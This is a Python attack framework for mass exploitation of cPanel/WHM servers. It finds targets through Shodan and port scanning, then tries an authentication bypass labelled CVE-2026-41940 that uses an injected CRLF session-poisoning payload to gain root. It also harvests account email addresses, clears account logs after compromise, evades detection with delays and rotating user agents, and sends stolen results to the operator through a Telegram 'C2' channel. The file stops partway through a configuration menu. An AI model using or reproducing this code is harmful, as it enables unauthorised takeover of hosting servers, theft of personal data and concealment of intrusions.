#!/usr/bin/env python3

import sys
import os
import re
import time
import json
import socket
import sqlite3
import threading
import logging
import base64
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from filelock import FileLock

try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    import requests
    HAS_CURL_CFFI = False

try:
    import pyfiglet
    HAS_PYFIGLET = True
except ImportError:
    HAS_PYFIGLET = False

import urllib3
import whois
from colorama import init, Fore
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

CPANEL_PORTS = [2082, 2083, 2086, 2087, 2095, 2096]
WHM_PORTS = [2086, 2087]
FAST_PORTS = [2087, 2083]
TIMEOUT = 10
RETRIES = 3
MAX_RETRIES = 3
FAST_TIMEOUT = 3
VERIFY_TIMEOUT = 2
SESSIONS_FILE = "sessions.json"
SESSIONS_LOCK = FileLock(SESSIONS_FILE + ".lock")
CONFIG_FILE = "config.json"

DEFAULT_CONFIG = {
    "shodan_api_key": "",
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    "scan_threads": 50,
    "exploit_threads": 20,
    "proxy": "",
    "min_delay": 0.5,
    "max_delay": 3.0,
    "stealth_mode": False
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
DEBUG = False

def clear_screen():
    try:
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
    except:
        os.system('clear')

def print_banner():
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RESET = '\033[0m'
    lines = []
    if HAS_PYFIGLET:
        try:
            banner_text = pyfiglet.figlet_format("cPanel-kill", font="slant")
            for line in banner_text.split('\n'):
                if line.strip():
                    lines.append(RED + line + RESET)
        except Exception:
            lines = [
                RED + "  _____  ____        _   _ _____ " + RESET,
                RED + " |  __ \/ __ \      | \ | |_   _|" + RESET,
                RED + " | |__) | |  | |_ __|  \| | | |  " + RESET,
                RED + " |  ___/| |  | | '__| . ` | | |  " + RESET,
                RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
                RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
            ]
    else:
        lines = [
            RED + "  _____  ____        _   _ _____ " + RESET,
            RED + " |  __ \/ __ \      | \ | |_   _|" + RESET,
            RED + " | |__) | |  | |_ __|  \| | | |  " + RESET,
            RED + " |  ___/| |  | | '__| . ` | | |  " + RESET,
            RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
            RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
        ]
    lines.append(YELLOW + "=" * 70 + RESET)
    lines.append(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
    lines.append(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
    lines.append(RED + "  Unauthorized use is a FEDERAL CRIME." + RESET)
    lines.append(YELLOW + "=" * 70 + RESET)
    for line in lines:
        print(line)
    sys.stdout.flush()

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def get_session(proxy=None):
    if HAS_CURL_CFFI:
        session = cffi_requests.Session(impersonate="chrome120", verify=False)
    else:
        session = requests.Session()
        session.verify = False
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

def request_with_retry(method, url, min_delay=0.5, max_delay=3.0, **kwargs):
    global DEBUG
    if min_delay > 0:
        time.sleep(random.uniform(min_delay, max_delay))
    for attempt in range(RETRIES):
        try:
            if DEBUG:
                logger.debug(f"REQUEST: {method} {url}")
                if 'headers' in kwargs:
                    logger.debug(f"Headers: {kwargs['headers']}")
                if 'data' in kwargs:
                    logger.debug(f"Data: {kwargs['data']}")
            session = kwargs.pop('session', get_session())
            session.headers["User-Agent"] = random.choice(USER_AGENTS)
            resp = session.request(method, url, timeout=TIMEOUT, **kwargs)
            if DEBUG:
                logger.debug(f"RESPONSE {resp.status_code}: {resp.text[:500]}")
            return resp
        except Exception as e:
            logger.warning(f"Request attempt {attempt+1}/{RETRIES} failed: {e}")
            time.sleep(1)
    return None

def check_port(host, port, timeout=TIMEOUT):
    try:
        addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
        for family, _, _, _, addr in addrs:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                result = sock.connect_ex(addr)
                sock.close()
                if result == 0:
                    return True
            except:
                continue
        return False
    except:
        return False

def verify_cpanel(host, port):
    scheme = "https" if port in [2083, 2087, 2096] else "http"
    url = f"{scheme}://{host}:{port}/"
    try:
        session = get_session()
        resp = session.head(url, timeout=VERIFY_TIMEOUT, allow_redirects=True)
        if resp.status_code in [200, 302, 401, 403]:
            server = resp.headers.get('Server', '')
            if 'cpanel' in server.lower():
                return True
            set_cookie = resp.headers.get('Set-Cookie', '')
            if 'cpsess' in set_cookie.lower() or 'cpanel' in set_cookie.lower():
                return True
        return False
    except:
        return False

def scan_single_fast(target):
    host = target.split(':')[0]
    if ':' in target:
        try:
            port = int(target.split(':')[1])
            if check_port(host, port, timeout=FAST_TIMEOUT):
                if verify_cpanel(host, port):
                    return host, port, "Open"
                return host, port, "Unknown"
            return host, port, "Closed"
        except:
            pass
    for port in FAST_PORTS:
        if check_port(host, port, timeout=FAST_TIMEOUT):
            if verify_cpanel(host, port):
                return host, port, "Open"
            return host, port, "Unknown"
    return host, None, "Closed"

def scan_targets(targets, threads, min_delay=0, max_delay=0):
    logger.info(f"Scanning {len(targets)} targets with {threads} threads...")
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single_fast, t): t for t in targets}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Filtering", file=sys.stdout):
            host, port, status = future.result()
            if status == "Open":
                tqdm.write(Fore.GREEN + f"[+] {host}:{port} - OPEN")
                results.append((host, port))
            else:
                tqdm.write(Fore.RED + f"[-] {host} - {status}")
    return results

def get_cpanel_version(host, port):
    endpoints = [
        (f"/json-api/version", "json"),
        (f"/version", "text"),
        (f"/cgi-sys/entropybanner.cgi", "html")
    ]
    scheme = "https" if port not in [2082, 2095] else "http"
    for path, resp_type in endpoints:
        url = f"{scheme}://{host}:{port}{path}"
        try:
            session = get_session()
            resp = session.get(url, timeout=TIMEOUT)
            if resp.status_code == 200:
                if resp_type == "json":
                    data = resp.json()
                    version = data.get('version', {}).get('version')
                    if version:
                        return version
                elif resp_type == "html":
                    match = re.search(r'cPanel\s+(\d+\.\d+\.\d+)', resp.text, re.I)
                    if match:
                        return match.group(1)
                else:
                    match = re.search(r'(\d+\.\d+\.\d+)', resp.text)
                    if match:
                        return match.group(1)
        except:
            continue
    return None

def get_major_version(version):
    if not version:
        return 0
    match = re.search(r'(\d+)\.', version)
    if match:
        try:
            return int(match.group(1))
        except:
            pass
    return 0

def obtain_session_cookie(host, port, session, min_delay, max_delay):
    """
    Tries multiple endpoints to obtain a cPanel session cookie.
    Returns (cookie_name, token) or (None, None) if none found.
    """
    base = f"{'https' if port not in [2082,2095] else 'http'}://{host}:{port}"
    endpoints = [
        "/",
        "/cpanel/",
        "/cpanel",
        "/cpanel/login",
        "/cgi-sys/entropybanner.cgi",
        "/json-api/version"
    ]
    for path in endpoints:
        resp = request_with_retry("GET", f"{base}{path}", session=session, min_delay=min_delay, max_delay=max_delay)
        if not resp:
            continue
        # Check Set-Cookie header
        if "Set-Cookie" in resp.headers:
            set_cookie = resp.headers["Set-Cookie"]
            match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
            if match:
                return match.group(1), session.cookies.get(match.group(1))
        # Check session cookies
        for cookie in session.cookies:
            if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
                return cookie.name, cookie.value
        # Check response body for cookie in meta or script
        if resp.text:
            # Look for a meta tag with session
            match = re.search(r'<meta[^>]+cpsess[0-9a-f]+[^>]+>', resp.text, re.I)
            if match:
                # Extract from content attribute
                content_match = re.search(r'cpsess([0-9a-f]+)', match.group(0), re.I)
                if content_match:
                    cookie_name = "cpsess" + content_match.group(1)
                    # Try to set it manually (server might not have set it)
                    session.cookies.set(cookie_name, "dummy")
                    return cookie_name, "dummy"
            # Look for a script variable
            match = re.search(r'cpsess[0-9a-f]+', resp.text, re.I)
            if match:
                cookie_name = match.group(0)
                session.cookies.set(cookie_name, "dummy")
                return cookie_name, "dummy"
    return None, None

def exploit_cve_2026_41940(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
    try:
        scheme = "https" if port not in [2082, 2095] else "http"
        base = f"{scheme}://{host}:{port}"
        session = get_session(proxy)

        version = get_cpanel_version(host, port)
        if get_major_version(version) > 120:
            return {"status": "CVE_Version_Patched", "token": None}

        # Stage 1: Obtain session cookie – using enhanced method
        cookie_name, token_value = obtain_session_cookie(host, port, session, min_delay, max_delay)
        if not cookie_name:
            # Generate dummy cookie
            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
            session.cookies.set(cookie_name, "dummy")
            token_value = "dummy"
            logger.info(f"Generated dummy cookie name: {cookie_name}")

        # Stage 2: Poison the session
        poison_payload = (
            "root:somepass\r\n"
            "user=root\r\n"
            "hasroot=1\r\n"
            "tfa_verified=1\r\n"
            "successful_internal_auth_with_timestamp=9999999999"
        )
        auth_b64 = base64.b64encode(poison_payload.encode()).decode()
        headers_auth = {"Authorization": f"Basic {auth_b64}"}
        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers_auth, min_delay=min_delay, max_delay=max_delay)
        if not resp2:
            return {"status": "CVE_Stage2_Failed", "token": None, "cookie_name": cookie_name}

        # Additional injection via headers
        headers_extra = {
            "User-Agent": f"{random.choice(USER_AGENTS)}\r\n{poison_payload}",
            "Referer": f"{base}/\r\n{poison_payload}",
            "X-Forwarded-For": f"127.0.0.1\r\n{poison_payload}"
        }
        request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers_extra, min_delay=min_delay, max_delay=max_delay)

        # Stage 3: Force session reload
        resp3 = request_with_retry("GET", f"{base}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
        if not resp3:
            return {"status": "CVE_Stage3_Failed", "token": None, "cookie_name": cookie_name}

        # Stage 4: Verify root access
        # Refresh token from session
        token_value = session.cookies.get(cookie_name)
        if not token_value:
            return {"status": "CVE_Verify_Failed", "token": None, "cookie_name": cookie_name}

        # Try listaccts
        resp4 = request_with_retry("GET", f"{base}/json-api/listaccts", session=session, min_delay=min_delay, max_delay=max_delay)
        if resp4 and resp4.status_code == 200:
            try:
                data = resp4.json()
                if 'data' in data and 'acct' in data['data']:
                    ver = get_cpanel_version(host, port)
                    return {
                        "status": "Exploited",
                        "token": token_value,
                        "cookie_name": cookie_name,
                        "version": ver,
                        "method": "CVE-2026-41940"
                    }
            except:
                pass

        # Fallback: try version endpoint
        resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session, min_delay=min_delay, max_delay=max_delay)
        if resp5 and resp5.status_code == 200:
            try:
                data = resp5.json()
                if 'version' in data:
                    return {
                        "status": "Exploited",
                        "token": token_value,
                        "cookie_name": cookie_name,
                        "version": data.get('version', {}).get('version'),
                        "method": "CVE-2026-41940"
                    }
            except:
                pass

        return {"status": "CVE_Verify_Failed", "token": None, "cookie_name": cookie_name}
    except Exception as e:
        logger.error(f"CVE exploit crashed on {host}:{port}: {e}")
        return {"status": "CVE_Exception", "token": None}

def exploit_graphql(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
    try:
        scheme = "https" if port not in [2082, 2095] else "http"
        base = f"{scheme}://{host}:{port}"
        url = f"{base}/graphql"
        session = get_session(proxy)
        # Try to get a cookie first
        cookie_name, token = obtain_session_cookie(host, port, session, min_delay, max_delay)
        if not cookie_name:
            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
            session.cookies.set(cookie_name, "dummy")
        probe = request_with_retry("GET", url, session=session, min_delay=min_delay, max_delay=max_delay)
        if probe and probe.status_code not in [200, 400, 405]:
            return {"status": "GraphQL_Not_Available", "token": None}
        payload = {
            "query": "query { __type(name: \"__schema\") { name } }",
            "variables": None,
            "operationName": None
        }
        headers = {"Content-Type": "application/json", "X-Forwarded-For": "127.0.0.1"}
        resp = request_with_retry("POST", url, session=session, json=payload, headers=headers, min_delay=min_delay, max_delay=max_delay)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if "errors" in data:
                    for err in data["errors"]:
                        if "cpsession" in err.get("message", ""):
                            token = re.search(r'cpsession=([^;]+)', err["message"])
                            if token:
                                return {"status": "Exploited", "token": token.group(1), "cookie_name": "cpsession"}
            except:
                pass
        if resp and "Set-Cookie" in resp.headers:
            cookie = resp.headers["Set-Cookie"]
            match = re.search(r'cpsession=([^;]+)', cookie)
            if match:
                return {"status": "Exploited", "token": match.group(1), "cookie_name": "cpsession"}
        return {"status": "GraphQL_Failed", "token": None}
    except Exception as e:
        logger.error(f"GraphQL exploit crashed on {host}:{port}: {e}")
        return {"status": "GraphQL_Exception", "token": None}

def exploit_legacy(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
    try:
        scheme = "https" if port not in [2082, 2095] else "http"
        base_url = f"{scheme}://{host}:{port}"
        session = get_session(proxy)
        # Get cookie first
        cookie_name, token = obtain_session_cookie(host, port, session, min_delay, max_delay)
        if not cookie_name:
            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
            session.cookies.set(cookie_name, "dummy")
        resp = request_with_retry("GET", f"{base_url}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
        if not resp or resp.status_code not in [200, 302]:
            return {"status": "Stage1_Failed", "token": None}
        # If we already have a cookie, we can skip the cookie extraction
        # But we need a valid cookie name
        if not cookie_name:
            # Try to extract from session
            for cookie in session.cookies:
                if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
                    cookie_name = cookie.name
                    break
            if not cookie_name:
                return {"status": "No_Cookie", "token": None}
        payload_lines = [
            "root:somepass",
            "user=root",
            "hasroot=1",
            "tfa_verified=1",
            "successful_internal_auth_with_timestamp=9999999999"
        ]
        payload = "\r\n".join(payload_lines)
        auth_b64 = base64.b64encode(payload.encode()).decode()
        headers = {"Authorization": f"Basic {auth_b64}"}
        resp2 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, headers=headers, min_delay=min_delay, max_delay=max_delay)
        if not resp2:
            return {"status": "Stage2_Failed", "token": None}
        resp3 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
        if not resp3:
            return {"status": "Stage3_Failed", "token": None}
        token_value = session.cookies.get(cookie_name)
        if token_value:
            return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name, "method": "Legacy"}
        return {"status": "Verify_Failed", "token": None}
    except Exception as e:
        logger.error(f"Legacy exploit crashed on {host}:{port}: {e}")
        return {"status": "Legacy_Exception", "token": None}

def exploit_cpanel(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
    methods = [
        ("CVE-2026-41940", exploit_cve_2026_41940),
        ("GraphQL", exploit_graphql),
        ("Legacy", exploit_legacy)
    ]
    result = None
    for name, func in methods:
        logger.info(f"Trying {name} exploit on {host}:{port}")
        result = func(host, port, proxy, min_delay, max_delay)
        if result and result.get("status") == "Exploited":
            result["method"] = name
            return result
        if result and result.get("token"):
            # We got a token but not fully exploited – could still be useful
            pass
    return result or {"status": "All_Methods_Failed", "token": None}

def validate_session(host, port, cookie_name, token, proxy=None, min_delay=0.5, max_delay=3.0):
    if not cookie_name or not token:
        return False
    scheme = "https" if port not in [2082, 2095] else "http"
    url = f"{scheme}://{host}:{port}/json-api/version"
    session = get_session(proxy)
    session.cookies.set(cookie_name, token)
    try:
        resp = request_with_retry("GET", url, session=session, min_delay=min_delay, max_delay=max_delay)
        return resp is not None and resp.status_code == 200
    except:
        return False

def extract_whois_emails(domain):
    try:
        w = whois.whois(domain, timeout=10)
        emails = []
        if w.emails:
            emails.extend(w.emails if isinstance(w.emails, list) else [w.emails])
        if w.registrant_email:
            emails.append(w.registrant_email)
        if w.admin_email:
            emails.append(w.admin_email)
        return list(set([e.lower() for e in emails if e and '@' in e]))
    except:
        return []

def extract_emails(host, port, cookie_name, token, proxy=None, min_delay=0.5, max_delay=3.0):
    if not cookie_name or not token:
        return []
    emails = []
    try:
        if port in WHM_PORTS:
            scheme = "https"
            base = f"{scheme}://{host}:{port}"
            session = get_session(proxy)
            session.cookies.set(cookie_name, token)
            resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session, min_delay=min_delay, max_delay=max_delay)
            if resp and resp.status_code == 200:
                data = resp.json()
                users = [acct['user'] for acct in data.get('data', {}).get('acct', [])]
                domain = host.split(':')[0]
                if users and 'domain' in data.get('data', {}).get('acct', [{}])[0]:
                    domain = data['data']['acct'][0]['domain']
                emails = [f"{u}@{domain}" for u in users]
        else:
            scheme = "https" if port not in [2082, 2095] else "http"
            base = f"{scheme}://{host}:{port}"
            session = get_session(proxy)
            session.cookies.set(cookie_name, token)
            url = f"{base}/json-api/Email"
            params = {
                "api.version": "1",
                "cpanel_jsonapi_func": "listpopswithdisk",
                "cpanel_jsonapi_apiversion": "2",
            }
            resp = request_with_retry("GET", url, session=session, params=params, min_delay=min_delay, max_delay=max_delay)
            if resp and resp.status_code == 200:
                data = resp.json()
                emails = [item.get('email') for item in data.get('cpanelresult', {}).get('data', []) if item.get('email')]
    except Exception as e:
        logger.warning(f"Error extracting emails from {host}: {e}")
    if not emails:
        emails = extract_whois_emails(host.split(':')[0])
    return emails

def clean_logs(host, port, cookie_name, token, proxy=None, min_delay=0.5, max_delay=3.0):
    if port not in WHM_PORTS:
        logger.warning("Log cleanup only supported via WHM ports (2086/2087)")
        return False
    if not cookie_name or not token:
        logger.warning("Missing cookie/token for log cleanup")
        return False
    scheme = "https"
    base = f"{scheme}://{host}:{port}"
    session = get_session(proxy)
    session.cookies.set(cookie_name, token)
    try:
        resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session, min_delay=min_delay, max_delay=max_delay)
        if resp and resp.status_code == 200:
            data = resp.json()
            users = [acct['user'] for acct in data.get('data', {}).get('acct', [])]
            for user in users:
                clear_url = f"{base}/json-api/clear_bandwidth"
                params = {"user": user}
                request_with_retry("GET", clear_url, session=session, params=params, min_delay=min_delay, max_delay=max_delay)
            logger.info(f"Cleared logs for {len(users)} accounts on {host}")
            return True
    except Exception as e:
        logger.error(f"Log cleanup failed on {host}: {e}")
    return False

class Database:
    def __init__(self, db_path="targets.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.cursor = self.conn.cursor()
        self._create_tables()
        self.lock = threading.Lock()

    def _create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host TEXT NOT NULL,
                port INTEGER,
                status TEXT,
                scanned INTEGER DEFAULT 0,
                exploited INTEGER DEFAULT 0,
                emails TEXT,
                token TEXT,
                cookie_name TEXT,
                version TEXT,
                last_exploit_attempt TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(host, port)
            )
        ''')
        for col in ['token', 'cookie_name', 'version', 'last_exploit_attempt']:
            try:
                self.cursor.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT")
            except sqlite3.OperationalError:
                pass
        self.conn.commit()

    def add_target(self, host, port=None):
        with self.lock:
            try:
                self.cursor.execute(
                    "INSERT OR IGNORE INTO targets (host, port) VALUES (?, ?)",
                    (host, port)
                )
                self.conn.commit()
                return True
            except Exception as e:
                logger.error(f"Failed to add target {host}:{port} - {e}")
                return False

    def get_pending_targets(self):
        with self.lock:
            self.cursor.execute(
                "SELECT id, host, port FROM targets WHERE scanned = 0"
            )
            return self.cursor.fetchall()

    def get_exploitable_targets(self):
        with self.lock:
            self.cursor.execute(
                "SELECT id, host, port, token, cookie_name FROM targets "
                "WHERE scanned = 1 AND exploited = 0 AND port IS NOT NULL"
            )
            return self.cursor.fetchall()

    def update_scan(self, target_id, status, port=None):
        with self.lock:
            if port is not None:
                self.cursor.execute(
                    "UPDATE targets SET status = ?, scanned = 1, port = ? WHERE id = ?",
                    (status, port, target_id)
                )
            else:
                self.cursor.execute(
                    "UPDATE targets SET status = ?, scanned = 1 WHERE id = ?",
                    (status, target_id)
                )
            self.conn.commit()

    def update_exploit(self, target_id, status, exploited, token=None, cookie_name=None, version=None, emails=None, attempt=None):
        with self.lock:
            self.cursor.execute(
                """UPDATE targets SET status = ?, exploited = ?, token = ?, cookie_name = ?,
                   version = ?, emails = ?, last_exploit_attempt = ? WHERE id = ?""",
                (status, exploited, token, cookie_name, version,
                 json.dumps(emails) if emails else None, attempt, target_id)
            )
            self.conn.commit()

    def update_port(self, target_id, port):
        with self.lock:
            self.cursor.execute(
                "UPDATE targets SET port = ? WHERE id = ?",
                (port, target_id)
            )
            self.conn.commit()

    def get_results(self):
        with self.lock:
            self.cursor.execute(
                "SELECT host, port, status, exploited, emails, token, cookie_name FROM targets WHERE scanned = 1"
            )
            return self.cursor.fetchall()

    def get_exploited_sessions(self):
        with self.lock:
            self.cursor.execute(
                "SELECT host, port, token, cookie_name FROM targets WHERE exploited = 1 AND token IS NOT NULL"
            )
            return self.cursor.fetchall()

    def close(self):
        self.conn.close()

def load_sessions():
    try:
        with SESSIONS_LOCK:
            if os.path.exists(SESSIONS_FILE):
                with open(SESSIONS_FILE, 'r') as f:
                    return json.load(f)
    except Exception:
        pass
    return {}

def save_sessions(sessions):
    try:
        with SESSIONS_LOCK:
            with open(SESSIONS_FILE, 'w') as f:
                json.dump(sessions, f, indent=2)
    except Exception:
        pass

class ShodanScanner:
    def __init__(self, api_key=None):
        self.api_key = api_key or os.getenv("SHODAN_API_KEY")

    def search(self, query="port:2087 cpanel", pages=1):
        if not self.api_key:
            print(Fore.RED + "[-] Shodan API key not configured. Set SHODAN_API_KEY env var.")
            return []
        try:
            import shodan
            api = shodan.Shodan(self.api_key)
            results = []
            for page in range(1, pages + 1):
                print(Fore.BLUE + f"[*] Fetching Shodan page {page}...")
                response = api.search(query, page=page)
                for result in response['matches']:
                    host = result.get('ip_str')
                    port = result.get('port')
                    if host and port:
                        results.append((host, port))
            print(Fore.GREEN + f"[+] Found {len(results)} targets from Shodan.")
            return results
        except ImportError:
            print(Fore.RED + "[-] Shodan library not installed. Install with: pip install shodan")
            return []
        except Exception as e:
            print(Fore.RED + f"[-] Shodan error: {e}")
            return []

def export_results(results, filename="results.json"):
    export_data = []
    for row in results:
        host, port, status, exploited, emails_json, token, cookie_name = row
        emails = json.loads(emails_json) if emails_json else []
        export_data.append({
            "host": host,
            "port": port,
            "status": status,
            "exploited": bool(exploited),
            "emails": emails,
            "token": token,
            "cookie_name": cookie_name,
            "timestamp": datetime.now().isoformat()
        })
    with open(filename, 'w') as f:
        json.dump(export_data, f, indent=2)
    txt_file = "emails.txt"
    with open(txt_file, 'w') as f:
        for entry in export_data:
            f.write(f"=== {entry['host']} ===\n")
            for email in entry['emails']:
                f.write(email + "\n")
            f.write("\n")
    logger.info(f"Results exported to {filename} and {txt_file}")
    return txt_file

class TelegramC2:
    def __init__(self, bot_token=None, chat_id=None):
        self.bot_token = bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
        self.chat_id = chat_id or os.getenv("TELEGRAM_CHAT_ID")

    def configure(self):
        print(Fore.CYAN + "\n[ Telegram C2 Configuration ]")
        self.bot_token = input("Enter Telegram Bot Token: ").strip() or self.bot_token
        self.chat_id = input("Enter Telegram Chat ID: ").strip() or self.chat_id
        if self.bot_token and self.chat_id:
            print(Fore.GREEN + "[+] Telegram configured.")
            return True
        return False

    def send(self, message, document_path=None):
        if not self.bot_token or not self.chat_id:
            logger.warning("Telegram not configured.")
            return False
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            resp = requests.post(url, data=payload, timeout=5)
            if resp.status_code != 200:
                logger.error(f"Telegram send error: {resp.text}")
                return False
        except Exception as e:
            logger.error(f"Telegram send failed: {e}")
            return False
        if document_path and os.path.exists(document_path):
            url_doc = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(document_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id}
                try:
                    resp = requests.post(url_doc, files=files, data=data, timeout=10)
                    if resp.status_code == 200:
                        logger.info("Telegram document sent.")
                    else:
                        logger.error(f"Telegram doc error: {resp.text}")
                except Exception as e:
                    logger.error(f"Telegram doc failed: {e}")
        logger.info("Telegram notification sent.")
        return True

class CPwn3rApp:
    def __init__(self):
        self.config = load_config()
        self.db = Database()
        self.telegram = TelegramC2(self.config.get("telegram_bot_token"), self.config.get("telegram_chat_id"))
        self.shodan_key = self.config.get("shodan_api_key")
        self.scan_threads = self.config.get("scan_threads", 50)
        self.exploit_threads = self.config.get("exploit_threads", 20)
        self.proxy = self.config.get("proxy", "")
        self.min_delay = self.config.get("min_delay", 0.5)
        self.max_delay = self.config.get("max_delay", 3.0)
        self.stealth_mode = self.config.get("stealth_mode", False)
        if self.stealth_mode:
            self.scan_threads = min(self.scan_threads, 10)
            self.exploit_threads = min(self.exploit_threads, 5)
            self.min_delay = max(self.min_delay, 1.0)
            self.max_delay = max(self.max_delay, 5.0)
        self.sessions = load_sessions()
        self.sessions_lock = threading.Lock()
        self.debug = False

    def run(self):
        self._main_menu()

    def _draw_menu(self):
        clear_screen()
        print_banner()
        print(Fore.CYAN + "\n" + "=" * 50)
        print(Fore.CYAN + "[ MAIN MENU ]")
        print("1. Load targets from file")
        print("2. Add single target")
        print("3. Shodan discovery")
        print("4. Scan targets")
        print("5. Exploit & extract emails")
        print("6. Configure Telegram C2")
        print("7. Export results")
        print("8. Send results via Telegram")
        print("9. Clean logs (post-exploit)")
        print("10. Toggle debug mode")
        print("11. Post-exploit actions")
        print("12. Edit configuration (threads, proxy, delays, stealth)")
        print("13. Exit")
        sys.stdout.write(Fore.WHITE + "Select: ")
        sys.stdout.flush()

    def _main_menu(self):
        while True:
            self._draw_menu()
            choice = input().strip()

            if choice == '1':
                self._load_targets()
            elif choice == '2':
                self._add_target()
            elif choice == '3':
                self._shodan_discovery()
            elif choice == '4':
                self._scan_targets()
            elif choice == '5':
                self._exploit_targets()
            elif choice == '6':
                self.telegram.configure()
                self._save_config_telegram()
            elif choice == '7':
                self._export_results()
            elif choice == '8':
                self._send_telegram()
            elif choice == '9':
                self._clean_logs()
            elif choice == '10':
                self.debug = not self.debug
                global DEBUG
                DEBUG = self.debug
                print(Fore.GREEN + f"[+] Debug mode {'ON' if self.debug else 'OFF'}")
            elif choice == '11':
                self._post_exploit()
            elif choice == '12':
                self._edit_config()
            elif choice == '13':
                print(Fore.CYAN + "[*] Goodbye.")
                self.db.close()
                sys.exit(0)
            else:
                print(Fore.RED + "[-] Invalid option.")

            input(Fore.YELLOW + "\nPress Enter to continue...")

    def _save_config_telegram(self):
        self.config["telegram_bot_token"] = self.telegram.bot_token
        self.config["telegram_chat_id"] = self.telegram.chat_id
        save_config(self.config)

    def _edit_config(self):
        print(Fore.CYAN + "\n[ Edit Configuration ]")
        print(f"1. Shodan API Key: {self.config.get('shodan_api_key', '')}")
        print(f"2. Telegram Bot Token: {self.config.get('telegram_bot_token', '')}")
        print(f"3. Telegram Chat ID: {self.config.get('telegram_chat_id', '')}")
        print(f"4. Scan Threads: {self.config.get('scan_threads', 50)}")
        print(f"5. Exploit Threads: {self.config.get('exploit_threads', 20)}")
        print(f"6. Proxy (e.g., http://127.0.0.1:8080): {self.config.get('proxy', '')}")
        print(f"7. Min Delay (seconds): {self.config.get('min_delay', 0.5)}")
        print(f"8. Max Delay (seconds): {self.config.get('max_delay', 3.0)}")
        print(f"9. Stealth Mode: {self.config.get('stealth_mode', False)}")
        print("10. Save and return")
